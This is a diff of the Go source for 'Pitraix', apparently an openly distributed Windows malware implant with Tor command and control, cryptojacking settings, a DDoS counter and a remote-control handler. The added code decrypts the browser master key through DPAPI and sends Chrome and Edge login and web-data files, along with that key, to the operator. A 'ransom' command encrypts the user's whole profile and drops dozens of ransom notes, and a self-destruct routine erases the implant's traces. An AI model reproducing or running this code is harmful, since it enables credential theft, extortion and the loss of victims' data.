@@ -1,23 +1,13 @@
-/*
-	THIS IS EXPERIEMENTAL PAYLOAD TARGETTING WINDOWS
-
-	- 2 RSA key hardcoded differently for encryption and signature
-	keys are hardcoded into the code it's self and never change, one is responsible for encryption and other for signature verification
-
-	- Generally after registering with agent, the HST would use his AES key for encrypted communications and not RSA
+/* 
+	Copyright (C) 2022 @MrCypher16 - All Rights Reserved
+	You may use, distribute and modify this code under the
+	terms of the MIT license. 
+	You should have received a copy of the MIT license with
+	this file. If not, please visit: github.com/ThrillQuks/Pitraix
 	
-	- Registering goes like this:
-	HST generates 256-bit-AES key, encrypts it with hardcoded Agent public-key and sends it to Agent/Operative(camaoflagued as an agent)
-	Then HST would only use that AES key for communcations
-
-	- If things could be random, even pesudorandom, lyst would do so. This rule applies to ports, locations, names, length of names of all files Pitraix will drop. To reduce detection rate
-
-	- Pitraix then modifies it's hardcoded agent address with it's own address and persists.
-
-
-	I know this file could be split into a billion file, but for now this works perfect.
-
+	the above notice does not apply to shit worlders
 */
+
 
 package main
 
@@ -57,9 +47,9 @@ import (
 	"errors"
 
 	"unsafe"
-	"gopkg.in/toast.v1"
 
-	// "github.com/go-vgo/robotgo"
+	// "gopkg.in/toast.v1"
+	"github.com/zavla/dpapi"
 	"github.com/micmonay/keybd_event"
 	"golang.org/x/net/proxy"
 	"github.com/atotto/clipboard"
@@ -73,6 +63,7 @@ const (
 
 		Leave it "OPTIONAL" for crypto jacking to be disabled
 	*/
+	
 	moneroAddr        = "OPTIONAL"
 	bitcoinSegwitAddr = "OPTIONAL"
 	bitcoinLegacyAddr = "OPTIONAL"
@@ -80,21 +71,34 @@ const (
 
 	
 
-	antiVM_Enabled = false // make it true if you don't want pitraix to run in virtual machines
+	antiVM_Enabled = false // true if you don't want virtual machines to run pitraix
 
 	// DO NOT CHANGE THIS MANUALLY, RUN OPER
-	raw_OPEncryptionKeyPEM = `RXLCJAFYNIYZRZMWTZNMIYVSKFUAYJFSZUDIKNRNPMHOTDVSCRGLYTATTRGKGHPWDUMGEUHTTMEBAJRNEOYRDDUDMNWGBWEOASVYVGZZCRXIRUZIFBPAVMZZEWATVSYQNYDJLZPSMYGTOPUSPBRASSWWFOQGWZLRCWQMVKCXTUFGSIVPDKCLLWDIFAWWCVXBXUKOKALCPQKBWGRFTFGZQGZUOAHOZYSSWOBCZKEBLWFBJBQZTXCGZOJIDCYHGWSJGCNAVXAIZUDPPUIIFWYZKYASBNWDVIHCOSYNSTWENAJJSUPXAUSVSXYTVDNYGMVTHAQAURQVKTWYOBOSLFKYWOSPZJTRKQLLOPJTGNOXGGHCTNATRCBGVAIMFWSSTRJSJACBJFQRUJRGESXYSSIUIYWFEDZHSPEEIHSRCFAOCWRRQJMDOOFZOLNPXWDUWXATEBIDKFMZBMSNMPMCYNJNGQGARSVPAWWFDVTGNEXVIRZVXJNXIIWEZKSGPERFKUXTFDHMRSBXUVDQJSUCLMIHYFVRIZRJKSLBEWKDVYFXMDMELBTLCGORDJFJPWNDEXVNXVVXYTAAMYKWYSHZDNVAZYTCBYOLBIJAWBGKVTHWVOEEULFWXEZQNSCWVRMUGIBYUHUIKEVMPDAOMSKXAXZSEHCYIMIIAFLFBBFMTZMOIAHKPUVXNKIUGWETMFSPEEXKOGPCQRLKSGMLZTAWKFDMCQLGPZFDDOHHKPIBOJCKDIGAKWYADJQTOFHWPXKBGYELBQELQULTTIQNJFCBHJAUYCEUOIZAFOVEKDQAKLW`
+	raw_OPEncryptionKeyPEM = `.DONT.CHANGE.THIS.NMIYVSKFUAYJFSZUDIKNRNPMHOTDVSCRGLYTATTRGKGHPWDUMGEUHTTMEBAJRNEOYRDDUDMNWGBWEOASVYVGZZCRXIRUZIFBPAVMZZEWATVSYQNYDJLZPSMYGTOPUSPBRASSWWFOQGWZLRCWQMVKCXTUFGSIVPDKCLLWDIFAWWCVXBXUKOKALCPQKBWGRFTFGZQGZUOAHOZYSSWOBCZKEBLWFBJBQZTXCGZOJIDCYHGWSJGCNAVXAIZUDPPUIIFWYZKYASBNWDVIHCOSYNSTWENAJJSUPXAUSVSXYTVDNYGMVTHAQAURQVKTWYOBOSLFKYWOSPZJTRKQLLOPJTGNOXGGHCTNATRCBGVAIMFWSSTRJSJACBJFQRUJRGESXYSSIUIYWFEDZHSPEEIHSRCFAOCWRRQJMDOOFZOLNPXWDUWXATEBIDKFMZBMSNMPMCYNJNGQGARSVPAWWFDVTGNEXVIRZVXJNXIIWEZKSGPERFKUXTFDHMRSBXUVDQJSUCLMIHYFVRIZRJKSLBEWKDVYFXMDMELBTLCGORDJFJPWNDEXVNXVVXYTAAMYKWYSHZDNVAZYTCBYOLBIJAWBGKVTHWVOEEULFWXEZQNSCWVRMUGIBYUHUIKEVMPDAOMSKXAXZSEHCYIMIIAFLFBBFMTZMOIAHKPUVXNKIUGWETMFSPEEXKOGPCQRLKSGMLZTAWKFDMCQLGPZFDDOHHKPIBOJCKDIGAKWYADJQTOFHWPXKBGYELBQELQULTTIQNJFCBHJAUYCEUOIZAFOVEKDQAKLW`
 
 	// raw_OPSigningKeyPEM = `LEAVE THIS EMPTY FOR NOW`
 
 	// DO NOT CHANGE THIS MANUALLY, RUN OPER
-	agentAddress = "SNOGOYXKJWNZRYZFLHRJBLAVLLNXLMNBDDPJPJGKMJJDYDLVQSUIDPZA"
+	agentAddress =".DONT.CHANGE.THIS.RJBLAVLLNXLMNBDDPJPJGKMJJDYDLVQSUIDPZA"
 
 
 
-	osName = 1 		 // Do not change this unless you know what you are doing
-	ddosCounter = 25 // Do not change this unless you know what you are doing
+	/*
+	
+		Do not change any of these consts unless you know what you are doing 
+	
+	*/
+	osName = 1
+	ddosCounter = 25
 
+	HORZRES          = 8
+	VERTRES          = 10
+	DESKTOPHORZRES   = 118
+	DESKTOPVERTRES   = 117
+	BI_RGB           = 0
+	InvalidParameter = 2
+	DIB_RGB_COLORS   = 0
+	SRCCOPY          = 0x00CC0020
 )
 
 var (	
@@ -256,8 +260,45 @@ var (
 	isadmin_const = isadmin()
 	
 	rdp_onetimeKey 	    string
-	browserS_onetimeKey string 
+	browserS_onetimeKey string
+
 )
+
+
+type (
+	HANDLE  uintptr
+	HWND    HANDLE
+	HGDIOBJ HANDLE
+	HDC     HANDLE
+	HBITMAP HANDLE
+)
+
+type BITMAPINFO struct {
+	BmiHeader BITMAPINFOHEADER
+	BmiColors *RGBQUAD
+}
+
+type BITMAPINFOHEADER struct {
+	BiSize          uint32
+	BiWidth         int32
+	BiHeight        int32
+	BiPlanes        uint16
+	BiBitCount      uint16
+	BiCompression   uint32
+	BiSizeImage     uint32
+	BiXPelsPerMeter int32
+	BiYPelsPerMeter int32
+	BiClrUsed       uint32
+	BiClrImportant  uint32
+}
+
+type RGBQUAD struct {
+	RgbBlue     byte
+	RgbGreen    byte
+	RgbRed      byte
+	RgbReserved byte
+}
+
 
 type config_File_Type struct {
 	Events   map[string][]string
@@ -303,8 +344,6 @@ func rdp(writer http.ResponseWriter, req *http.Request) {
 
 			fmt.Println("move", x, y)
 			// robotgo.Move(x, y)
-		
-			// Select keys to be pressed
 			
 		} else if strings.HasPrefix(string(msg), "key") {
 			spl := strings.Split(string(msg), " ")
@@ -333,6 +372,34 @@ func rdp(writer http.ResponseWriter, req *http.Request) {
 	
 }
 
+func getUserKey(path string) ([]byte, error) {
+	localState, err := readFile(path)
+
+	if err != nil {
+		return []byte{}, err
+	}
+
+	keyBase64 := string(localState)
+	keyBase64 =  keyBase64[strings.Index(keyBase64, "{\"encrypted_key\":") + 18:]
+
+	for index, char := range keyBase64 {
+		if string(char) == "\"" {
+			keyBase64 = keyBase64[:index]
+			break
+		}
+
+	}
+
+	keyEncrypted, err := base64.StdEncoding.DecodeString(keyBase64)
+	if err != nil {
+		return []byte{}, err
+	}
+
+	keyDecrypted, err := dpapi.Decrypt(keyEncrypted[5:])
+
+	return keyDecrypted, err
+}
+
 
 func snatchBrowsersData(writer http.ResponseWriter, req *http.Request) {
 	c, err := upgrader.Upgrade(writer, req, nil)
@@ -351,60 +418,144 @@ func snatchBrowsersData(writer http.ResponseWriter, req *http.Request) {
 	var browsersPaths = []string{
 		filepath.Join(appDataLocal, "Microsoft", "Edge"),
 		filepath.Join(appDataLocal, "Google", "Chrome"),
-		filepath.Join(appDataLocal, "BraveSoftware", "Brave-Browser"),
-		filepath.Join(appDataLocal, "Yandex", "YandexBrowser"),
-		filepath.Join(appDataRoaming, "Opera Software", "Opera Stable"),
+		// filepath.Join(appDataLocal, "BraveSoftware", "Brave-Browser"),
+		// filepath.Join(appDataRoaming, "Opera Software", "Opera Stable"),
+		// filepath.Join(appDataLocal, "Yandex", "YandexBrowser"),
 	}
 
 	var browserFiles = []string{
 		filepath.Join("User Data", "Default", "Login Data"),
+		filepath.Join("User Data", "Default", "Web Data"),
+
 	}
 
-	// fmt.Println(mt, string(msg), err)
-	
-	var bigdick string
-
-	if string(msg) == "baddie" {
+	if string(msg) == "extract" {
 		for index, browser := range browsersPaths {
 			if file_Exists(browser) {
-				fmt.Println("Yes", index, browser)
-	
-				for _, browserF := range browserFiles {
-					data, err := readFile(filepath.Join(browser, browserF))
-					fmt.Println(filepath.Join(browser, browserF), browser, browserF, len(data), err)
+				fmt.Println(index, "Yes", browser)
+				userKey, err := getUserKey(filepath.Join(browser, "User Data", "Local State"))
+				if err != nil {
+					fmt.Println("error retrieving user key: ", err)
+					err = c.WriteMessage(mt, []byte("error: " + err.Error()))
+
 					if err != nil {
-						fmt.Println(data)
-						bigdick += " " + base64.StdEncoding.EncodeToString(data)
-
-					} else {
-						fmt.Println("err", err)
+						fmt.Println("write error:", err)
+						return
 					}
-					// sendata <- data
+
+				} else {
+					for _, browserF := range browserFiles {
+
+						data, err := readFile(filepath.Join(browser, browserF))
+						if err != nil {
+							fmt.Println("error retrieving user key: ", err)
+							err = c.WriteMessage(mt, []byte("error: " + err.Error()))
+
+							if err != nil {
+								fmt.Println("write error:", err)
+								return
+							}
+
+						} else {
+							// "Chrome|Login Data|Key|File Base64"
+							err = c.WriteMessage(mt, []byte(fmt.Sprintf("%s|%s|%s|%s", filepath.Base(browser), filepath.Base(browserF), base64.StdEncoding.EncodeToString(userKey), base64.StdEncoding.EncodeToString(data))))
+
+							if err != nil {
+								fmt.Println("write error:", err)
+								return
+							}
+
+						}
+
+					}
+
 				}
-	
-			} else {
-				fmt.Println("No", index, browser)
-				
+
 			}
-	
-		}
-
-
-		err = c.WriteMessage(mt, []byte(bigdick))
-
-		if err != nil {
-			fmt.Println("write:", err)
-			return
-		}
 		
-		err = c.WriteMessage(mt, []byte("hadie"))
+		}
+
+		err = c.WriteMessage(mt, []byte("done"))
 
 		if err != nil {
-			fmt.Println("write:", err)
+			fmt.Println("write error:", err)
 			return
 		}
 
 	}
+	// userkeys := []string{}
+
+	// if string(msg) == "genius" {
+
+	// 	for index, browser := range browsersPaths {
+	// 		if file_Exists(browser) {
+	// 			fmt.Println("Yes", index, browser)
+
+	// 			userKey, err := getUserKey(filepath.Join(browser, "User Data", "Local State"))
+	// 			if err != nil {
+	// 				fmt.Println("error retrieving user key: ", err)
+					
+	// 			} else {
+
+	// 				userkeys = append(userkeys, string(userKey))
+
+	// 				for _, browserF := range browserFiles {
+	// 					data, err := readFile(filepath.Join(browser, browserF))
+	// 					fmt.Println(filepath.Join(browser, browserF), browser, browserF, len(data), err)
+
+	// 					if err == nil {
+	// 						fmt.Println(len(data))
+	// 						err = c.WriteMessage(mt, data)
+
+	// 						if err != nil {
+	// 							fmt.Println("write:", err)
+	// 							return
+	// 						}
+
+
+	// 					} else {
+	// 						fmt.Println("err", err)
+
+	// 					}
+	// 					// sendata <- data
+						
+	// 				}
+
+	// 			}
+	
+	// 		} else {
+	// 			// fmt.Println("No", index, browser)
+				
+	// 		}
+	
+	// 	}
+		
+	// 	err = c.WriteMessage(mt, []byte("dan"))
+
+	// 	if err != nil {
+	// 		fmt.Println("write:", err)
+	// 		return
+	// 	}
+
+	// 	for i, k := range userkeys {
+	// 		fmt.Println(i, k)
+	// 		err = c.WriteMessage(mt, []byte(k))
+
+	// 		if err != nil {
+	// 			fmt.Println("write:", err)
+	// 			return
+	// 		}
+			
+	// 	}
+
+	// 	err = c.WriteMessage(mt, []byte("yog"))
+
+	// 	if err != nil {
+	// 		fmt.Println("write:", err)
+	// 		return
+	// 	}
+
+//	}
 
 	
 }
@@ -452,7 +603,7 @@ func captureRect(rect image.Rectangle) (*image.RGBA, error) {
 	}
 	defer releaseDC(0, hDC)
 
-	m_hDC := CreateCompatibleDC(hDC)
+	m_hDC := createCompatibleDC(hDC)
 	if m_hDC == 0 {
 		return nil, fmt.Errorf("Could not Create Compatible DC err:%d.\n", getLastError())
 	}
@@ -589,7 +740,7 @@ func createDIBSection(hdc HDC, pbmi *BITMAPINFO, iUsage uint, ppvBits *unsafe.Po
 	return HBITMAP(ret)
 }
 
-func CreateCompatibleDC(hdc HDC) HDC {
+func createCompatibleDC(hdc HDC) HDC {
 	ret, _, _ := procCreateCompatibleDC.Call(
 		uintptr(hdc))
 
@@ -599,51 +750,6 @@ func CreateCompatibleDC(hdc HDC) HDC {
 
 	return HDC(ret)
 }
-
-type (
-	HANDLE  uintptr
-	HWND    HANDLE
-	HGDIOBJ HANDLE
-	HDC     HANDLE
-	HBITMAP HANDLE
-)
-
-type BITMAPINFO struct {
-	BmiHeader BITMAPINFOHEADER
-	BmiColors *RGBQUAD
-}
-
-type BITMAPINFOHEADER struct {
-	BiSize          uint32
-	BiWidth         int32
-	BiHeight        int32
-	BiPlanes        uint16
-	BiBitCount      uint16
-	BiCompression   uint32
-	BiSizeImage     uint32
-	BiXPelsPerMeter int32
-	BiYPelsPerMeter int32
-	BiClrUsed       uint32
-	BiClrImportant  uint32
-}
-
-type RGBQUAD struct {
-	RgbBlue     byte
-	RgbGreen    byte
-	RgbRed      byte
-	RgbReserved byte
-}
-
-const (
-	HORZRES          = 8
-	VERTRES          = 10
-	DESKTOPHORZRES   = 118
-	DESKTOPVERTRES   = 117
-	BI_RGB           = 0
-	InvalidParameter = 2
-	DIB_RGB_COLORS   = 0
-	SRCCOPY          = 0x00CC0020
-)
 
 func readFile(filePath string) ([]byte, error){
 	file, err := os.Open(filePath)
@@ -700,7 +806,8 @@ func createConfFile(problem string) {
 	out, _ := json.Marshal(cft)
 	pl_encrypted, pl_nonce, _ := encrypt_AES(out, locAES_Key)
 	f, _ := os.Create(config_FilePath)
-	f.WriteString(base64.StdEncoding.EncodeToString(pl_encrypted) + "|" + base64.StdEncoding.EncodeToString(pl_nonce))
+	f.Write(append(pl_encrypted, pl_nonce...))
+	// f.WriteString(base64.StdEncoding.EncodeToString(pl_encrypted) + "|" + base64.StdEncoding.EncodeToString(pl_nonce))
 	f.Close()
 }
 
@@ -714,7 +821,43 @@ func confUpdaterAsync() {
 
 func (cft *config_File_Type) updateConf(ind string, val []string) {
 	// fmt.Println(ind, val, locAES_Key)
+
 	fc, err := readFile(config_FilePath)
+	// if err != nil {
+	// 	fmt.Println("no conf file: ", config_FilePath, err)
+	// 	AES_Key = random_Bytes(32, true)
+	// 	createConfFile("conf file not exist")
+	// 	cft.updateConf(ind, val)
+	// 	fmt.Println("fixed")
+	// 	firstTime = true
+	// } else {
+	// 	fc_splitted := strings.Split(string(fc), "|")
+	// 	if len(fc_splitted) != 2 {
+	// 		AES_Key = random_Bytes(32, true)
+	// 		createConfFile("conf file tampered not len 2")
+	// 		cft.updateConf(ind, val)
+	// 		fmt.Println("fixed")
+	// 		firstTime = true
+	// 		// os.Remove(config_FilePath)
+	// 	} else {
+	// 		fc_deciphered, err := base64.StdEncoding.DecodeString(fc_splitted[0])
+	// 		if err != nil {
+	// 			AES_Key = random_Bytes(32, true)
+	// 			createConfFile("conf file base64 1 tampered")
+	// 			cft.updateConf(ind, val)
+	// 			fmt.Println("fixed")
+	// 			firstTime = true
+	// 			// os.Remove(config_FilePath)
+	// 		} else {
+	// 			fc_nonce, err := base64.StdEncoding.DecodeString(fc_splitted[1])
+	// 			if err != nil {
+	// 				AES_Key = random_Bytes(32, true)
+	// 				createConfFile("conf file base64 2 tampered")
+	// 				cft.updateConf(ind, val)
+	// 				fmt.Println("fixed")
+	// 				firstTime = true
+	// 				// os.Remove(config_FilePath)
+	// 			} else {
 	if err != nil {
 		fmt.Println("no conf file: ", config_FilePath, err)
 		AES_Key = random_Bytes(32, true)
@@ -722,132 +865,112 @@ func (cft *config_File_Type) updateConf(ind string, val []string) {
 		cft.updateConf(ind, val)
 		fmt.Println("fixed")
 		firstTime = true
+
 	} else {
-		fc_splitted := strings.Split(string(fc), "|")
-		if len(fc_splitted) != 2 {
+		// fc_splitted := strings.Split(string(fc), "|")
+
+		if len(fc) < 15 {
 			AES_Key = random_Bytes(32, true)
-			createConfFile("conf file tampered not len 2")
+			createConfFile("conf file tampered not len 12")
 			cft.updateConf(ind, val)
 			fmt.Println("fixed")
 			firstTime = true
 			// os.Remove(config_FilePath)
+
 		} else {
-			fc_deciphered, err := base64.StdEncoding.DecodeString(fc_splitted[0])
+
+			decrypted_fc, err := decrypt_AES(fc[:len(fc) - 12], fc[len(fc) - 12:], locAES_Key)
 			if err != nil {
 				AES_Key = random_Bytes(32, true)
-				createConfFile("conf file base64 1 tampered")
+				createConfFile("conf file decryption error")
 				cft.updateConf(ind, val)
 				fmt.Println("fixed")
 				firstTime = true
 				// os.Remove(config_FilePath)
+
 			} else {
-				fc_nonce, err := base64.StdEncoding.DecodeString(fc_splitted[1])
+				// fmt.Println(string(decrypted_fc))
+				err = json.Unmarshal(decrypted_fc, &cft)
+
 				if err != nil {
 					AES_Key = random_Bytes(32, true)
-					createConfFile("conf file base64 2 tampered")
+					createConfFile("conf file unmarshal error tampered")
 					cft.updateConf(ind, val)
 					fmt.Println("fixed")
 					firstTime = true
 					// os.Remove(config_FilePath)
+
 				} else {
-					if len(fc_nonce) != 12 {
-						fmt.Println("Invalid nonce length", len(fc_nonce), fc_nonce)
-						AES_Key = random_Bytes(32, true)
-						createConfFile("conf file invalid nonce length")
-						cft.updateConf(ind, val)
-						fmt.Println("fixed")
-						firstTime = true
-						// os.Remove(config_FilePath)
-					} else {
-						decrypted_fc, err := decrypt_AES(fc_deciphered, fc_nonce, locAES_Key)
-						if err != nil {
-							AES_Key = random_Bytes(32, true)
-							createConfFile("conf file decryption error")
-							cft.updateConf(ind, val)
-							fmt.Println("fixed")
-							firstTime = true
-							// os.Remove(config_FilePath)
+					// cft.AES_Key, _ = base64.StdEncoding.DecodeString(cft.AES_Key)
+					if ind == "aes" {
+						cft.AES_Key = val[0]
+
+					} else if ind == "contactd" {
+						cft.ContactD = val[0]
+
+					} else if ind == "register" {
+						// fmt.Println("got register")
+
+						if val[0] == "true" {
+							fmt.Println("Registered!")
+							cft.Register = true
+
 						} else {
-							// fmt.Println(string(decrypted_fc))
-							err = json.Unmarshal(decrypted_fc, &cft)
-							if err != nil {
-								AES_Key = random_Bytes(32, true)
-								createConfFile("conf file unmarshal error tampered")
-								cft.updateConf(ind, val)
-								fmt.Println("fixed")
-								firstTime = true
-								// os.Remove(config_FilePath)
-							} else {
-								// cft.AES_Key, _ = base64.StdEncoding.DecodeString(cft.AES_Key)
-								if ind == "aes" {
-									cft.AES_Key = val[0]
-								} else if ind == "contactd" {
-									cft.ContactD = val[0]
-								} else if ind == "register" {
-									fmt.Println("got register")
-									if val[0] == "true" {
-										fmt.Println("set register to true")
-										cft.Register = true
-									} else {
-										cft.Register = false 
-									}
-								} else if ind == "logs" {
-									cft.Logs[strconv.Itoa(len(cft.Logs) + 1)] = []string{val[0], val[1], val[2]}
-
-								} else if ind == "clearlogs" {
-									cft.Logs = map[string][]string{"1": {"clear", "cleared logs upon request", contactDate}}
-
-								} else if ind == "events" {
-									// fmt.Println("current len is:", len(cft.Events))
-									cft.Events[strconv.Itoa(len(cft.Events) + 1)] = []string{val[0], val[1], val[2]}
-									// fmt.Println(len(cft.Events), "done", ind, val)
-									// fmt.Println(cft.Events)
-
-								} else if ind == "modules" {
-									fmt.Println(ind, len(val), val)
-									cft.Modules[val[0]] = []string{val[1], val[2], val[3]}
-									
-								} else if ind == "regtmp" {
-									cft.RegTmp = append(cft.RegTmp, val[0])
-
-								} else if ind == "clearregtmp" {
-									cft.RegTmp = []string{}
-
-								} else if ind == "routesh" {
-									cft.RoutesH = append(cft.RoutesH, val[0])
-
-								} else if ind == "clearroutesh" {
-									cft.RoutesH = []string{}
-
-								} else if ind == "fetch" {
-								} else {
-									fmt.Println("Invalid index!", ind, val)
-								}
-								// fmt.Println(cft, ind, val)
-								
-								AES_Key, _ = base64.StdEncoding.DecodeString(cft.AES_Key)
-
-								if ind != "fetch" {
-									// fmt.Println("config file unmrashalled:", cft)
-									f, err := os.Create(config_FilePath)
-									if err != nil {
-										fmt.Println("Error writing conf file!!!", config_FilePath, err)
-										// os.Remove(config_FilePath)
-									} 
-									out, _ := json.Marshal(cft)
-									pl_encrypted, pl_nonce, _ := encrypt_AES(out, locAES_Key)
-									pl_encoded := fmt.Sprintf("%s|%s", base64.StdEncoding.EncodeToString(pl_encrypted), base64.StdEncoding.EncodeToString(pl_nonce))
-									f.WriteString(pl_encoded)
-
-									fmt.Println("updated conf file")	
-								} else {
-									fmt.Println("updated cft but not conf file")
-								}
-
-							}
+							cft.Register = false 
 
 						}
 
+					} else if ind == "logs" {
+						cft.Logs[strconv.Itoa(len(cft.Logs) + 1)] = []string{val[0], val[1], val[2]}
+
+					} else if ind == "clearlogs" {
+						cft.Logs = map[string][]string{"1": {"clear", "cleared logs upon request", contactDate}}
+
+					} else if ind == "events" {
+						// fmt.Println("current len is:", len(cft.Events))
+						cft.Events[strconv.Itoa(len(cft.Events) + 1)] = []string{val[0], val[1], val[2]}
+						// fmt.Println(len(cft.Events), "done", ind, val)
+						// fmt.Println(cft.Events)
+
+					} else if ind == "modules" {
+						// fmt.Println(ind, len(val), val)
+						cft.Modules[val[0]] = []string{val[1], val[2], val[3]}
+						
+					} else if ind == "regtmp" {
+						cft.RegTmp = append(cft.RegTmp, val[0])
+
+					} else if ind == "clearregtmp" {
+						cft.RegTmp = []string{}
+
+					} else if ind == "routesh" {
+						cft.RoutesH = append(cft.RoutesH, val[0])
+
+					} else if ind == "clearroutesh" {
+						cft.RoutesH = []string{}
+
+					} else if ind == "fetch" {
+					} else {
+						fmt.Println("Invalid index!", ind, val)
+					}
+					// fmt.Println(cft, ind, val)
+					
+					AES_Key, _ = base64.StdEncoding.DecodeString(cft.AES_Key)
+
+					if ind != "fetch" {
+						// fmt.Println("config file unmrashalled:", cft)
+						f, err := os.Create(config_FilePath)
+						if err != nil {
+							fmt.Println("Error writing conf file!!!", config_FilePath, err)
+							// os.Remove(config_FilePath)
+						} 
+						out, _ := json.Marshal(cft)
+						pl_encrypted, pl_nonce, _ := encrypt_AES(out, locAES_Key)
+						// pl_encoded := fmt.Sprintf("%s|%s", base64.StdEncoding.EncodeToString(pl_encrypted), base64.StdEncoding.EncodeToString(pl_nonce))
+						f.Write(append(pl_encrypted, pl_nonce...))
+
+						fmt.Println("updated conf file")	
+					} else {
+						fmt.Println("updated cft but not conf file")
 					}
 
 				}
@@ -926,6 +1049,9 @@ func setupTor(path, port, name string, ipinfo_struct *ipInfo, forceSetup bool) s
 			if err != nil {
 				certError_Count += 1
 				if certError_Count == 5 {
+					/*
+						This should allow pitraix to work even on severely outdated machines
+					*/
 					http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 					fmt.Println("####### IMPORTANT ####### InsecureSkipVerify: true")
 				}
@@ -933,6 +1059,7 @@ func setupTor(path, port, name string, ipinfo_struct *ipInfo, forceSetup bool) s
 				time.Sleep(time.Second * 5)
 				continue
 			}
+
 			if len(tor) < 300 {
 				// fmt.Println("Not found", v1m, v2m, v3m)
 				if v3m == 20 {
@@ -1002,7 +1129,7 @@ func setupTor(path, port, name string, ipinfo_struct *ipInfo, forceSetup bool) s
 	}
 
 	if ft == true && running_check("9050") {
-		doInstru("shell", "taskkill /f /im tor", true)
+		doInstru("shell", "taskkill /f /im tor.exe", true)
 	}
 
 	doInstru("shellnoop", filepath.Join(path, name, "Tor", "tor.exe") + " -f " + filepath.Join(path, name, name + "torrc"), true)
@@ -1064,15 +1191,18 @@ func doInstru(ic, iv string, bypitraix bool) string {
 
 	case "selfdestruct":
 		doInstru("shell", "taskkill /f /im tor.exe", true)
+		
 		os.Remove(config_FilePath)
 		os.RemoveAll(tor_FolderPath)
 		os.Remove(pitraix_FilePath)
 		os.Remove(currentPath)
-		os.RemoveAll(mainDrive + "\\Users\\" + username + "\\AppData\\Roaming\\tor")
-		fmt.Println("goodbye")
-		// 
+		os.RemoveAll(filepath.Join(appDataRoaming, "tor"))
+		
+		fmt.Println("Goodbye")
+
 		doInstru("shell", "taskkill /f /im lyst_windows.exe", true)
 		doInstru("shell", "taskkill /f /im " + filepath.Base(pitraix_FilePath), true)
+		os.Exit(0)
 
 	case "shell": // shell instruction with output (locking)
 		cmd := exec.Command(shell, "/c", iv)
@@ -1330,47 +1460,57 @@ func doInstru(ic, iv string, bypitraix bool) string {
 
 	
 	case "notify":
-		ivspl := strings.Split(iv, " ")
-		if len(ivspl) < 2 {
-			out = "Error: iv length is not 2"
-		} else {
-			notif := toast.Notification{AppID: "Pitraix", Title: ivspl[0], Message: iv[len(ivspl[0]) + 1:],}
-			err := notif.Push()
-			if err != nil {
-				out = "Error: " + err.Error()
-			} else {
-				out = "Done."
-			}
-		}
+		out = "Temporarily unavailable"
+		// ivspl := strings.Split(iv, " ")
+		// if len(ivspl) < 2 {
+		// 	out = "Error: iv length is not 2"
+
+		// } else {
+		// 	notif := toast.Notification{AppID: "Pitraix", Title: ivspl[0], Message: iv[len(ivspl[0]) + 1:],}
+		// 	err := notif.Push()
+		// 	if err != nil {
+		// 		out = "Error: " + err.Error()
+
+		// 	} else {
+		// 		out = "Done."
+
+		// 	}
+
+		// }
 
 	case "ransom":
 		ivspl := strings.Split(iv, " ")
 		if len(ivspl) != 4 {
 			out = "Error: iv length is not 4"
+			
 		} else {
 			key, err := base64.StdEncoding.DecodeString(ivspl[3])
 			if err != nil {
 				out = "Error:" + err.Error()
 			} else {
-				text := fmt.Sprintf("All of your files have been encrypted. Do not bother searching online. The only people on earth that can decrypt your files are us.\nTo start the decryption process, send %s %s to this address:\n%s", ivspl[0], ivspl[1], ivspl[2])
+				text := fmt.Sprintf("All of your files have been encrypted.\nDo not bother searching online. The only people on earth that can decrypt your files are us.\nTo start the decryption process, Send %s %s to this address:\n%s", ivspl[0], ivspl[1], ivspl[2])
 
-				start_paths := []string{
-					mainDrive + "\\" + "Users\\" + username + "\\Desktop",
-					mainDrive + "\\" + "Users\\" + username + "\\Documents",
-					mainDrive + "\\" + "Users\\" + username + "\\Downloads",
-					mainDrive + "\\" + "Users\\" + username + "\\Pictures",
-					mainDrive + "\\" + "Users\\" + username + "\\Videos",
-					mainDrive + "\\" + "Users\\" + username + "\\Music",
-				}
+				startPath := filepath.Join(mainDrive, "Users", username)
+				
+				// []string{
+				// 	mainDrive + "\\" + "Users\\" + username + "\\Desktop",
+				// 	mainDrive + "\\" + "Users\\" + username + "\\Documents",
+				// 	mainDrive + "\\" + "Users\\" + username + "\\Downloads",
+				// 	mainDrive + "\\" + "Users\\" + username + "\\Pictures",
+				// 	mainDrive + "\\" + "Users\\" + username + "\\Videos",
+				// 	mainDrive + "\\" + "Users\\" + username + "\\Music",
+				// }
 
-				for _, path := range start_paths {
-					go encFiles(path, key)
-				}
+				go encFiles(startPath, key)
+
+				// for _, path := range start_paths {
+				//	go encFiles(path, key)
+				// }
 				
 				time.Sleep(2 * time.Second)
 
 				for i := 0; i < 69; i++ {
-					f, _ := os.Create(start_paths[0] + fmt.Sprintf("\\READ_ME_%d.txt", i + 1))
+					f, _ := os.Create(filepath.Join(startPath, "Desktop", fmt.Sprintf("READ_ME_%d.txt", i + 1)))
 					f.WriteString(text)
 					f.Close()
 				}
@@ -1405,10 +1545,11 @@ func doInstru(ic, iv string, bypitraix bool) string {
 				}()
 
 				go func(coin string) {
-					notif := toast.Notification{AppID: "Pitraix", Title: "pitraix", Message: "All your files have been locked. Please follow instructions on how to get them back", }
-					notif.Push()
+					// notif := toast.Notification{AppID: "Pitraix", Title: "pitraix", Message: "All your files have been locked. Please follow instructions on how to get them back", }
+					// / notif.Push()
 					time.Sleep(6 * time.Second)
-					doInstru("shell", "notepad.exe " + mainDrive + "\\" + "Users\\" + username + "\\Desktop\\READ_ME_25.txt", true)
+					doInstru("shell", "notepad.exe " + filepath.Join(mainDrive, "Users", username, "Desktop", "READ_ME_15.txt"), true)
+					// mainDrive + "\\" + "Users\\" + username + "\\Desktop\\READ_ME_25.txt", true)
 					time.Sleep(165)
 					doInstru("shell", "start chrome \"https://www.google.com/search?q=How to buy " + coin + "\"", true)
 
@@ -1425,18 +1566,24 @@ func doInstru(ic, iv string, bypitraix bool) string {
 			out = "Error:" + err.Error()
 		} else {
 
-			start_paths := []string{
-				mainDrive + "\\" + "Users\\" + username + "\\Desktop",
-				mainDrive + "\\" + "Users\\" + username + "\\Documents",
-				mainDrive + "\\" + "Users\\" + username + "\\Downloads",
-				mainDrive + "\\" + "Users\\" + username + "\\Pictures",
-				mainDrive + "\\" + "Users\\" + username + "\\Videos",
-				mainDrive + "\\" + "Users\\" + username + "\\Music",
-			}
+			startPath := filepath.Join(mainDrive, "Users", username)
 
-			for _, path := range start_paths {
-				go decFiles(path, key)
-			}
+			// []string{
+			// 	mainDrive + "\\" + "Users\\" + username + "\\Desktop",
+			// 	mainDrive + "\\" + "Users\\" + username + "\\Documents",
